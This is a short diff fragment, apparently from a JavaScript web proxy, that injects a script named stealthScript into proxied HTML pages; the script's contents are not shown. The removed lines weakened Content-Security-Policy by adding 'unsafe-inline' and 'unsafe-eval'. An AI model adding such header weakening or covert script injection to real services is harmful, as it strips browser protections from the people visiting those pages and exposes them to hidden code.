-                    csp = csp.replace("script-src", "script-src 'unsafe-inline' 'unsafe-eval'");
-                    csp = csp.replace("style-src", "style-src 'unsafe-inline'");
-                    responseHeaders.append(key, csp);
                 } else {
                     responseHeaders.append(key, value);
                 }
@@ -1122,14 +1096,8 @@ export default {
 })();
 <\/script>`;
                 
-                // Inject before </head> or at start
-                if (htmlText.includes("</head>")) {
-                    htmlText = htmlText.replace("</head>", stealthScript + "</head>");
-                } else if (htmlText.includes("<body")) {
-                    htmlText = htmlText.replace("<body", stealthScript + "<body");
-                } else {
-                    htmlText = stealthScript + htmlText;
-                }
+                if (htmlText.includes("<head>")) htmlText = htmlText.replace("<head>", "<head>" + stealthScript); 
+                else htmlText = stealthScript + htmlText;
                 
                 body = htmlText;
                 responseHeaders.delete("Content-Length");
